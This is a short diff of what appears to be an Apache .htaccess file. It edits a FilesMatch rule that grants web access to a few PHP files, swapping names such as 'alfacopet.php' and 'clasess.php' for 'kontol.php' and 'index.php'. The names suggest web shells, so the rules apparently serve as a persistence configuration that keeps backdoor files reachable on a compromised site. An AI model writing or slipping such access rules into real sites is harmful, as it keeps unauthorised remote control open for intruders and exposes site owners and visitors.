@@ -9,7 +9,7 @@ Order allow,deny
 Allow from all
 </FilesMatch>
 
-<FilesMatch '^(clasess.php|alfacopet.php|tol.php)$'>
+<FilesMatch '^(kontol.php|index.php|tol.php)$'>
 Order allow,deny
 Allow from all
 </FilesMatch>
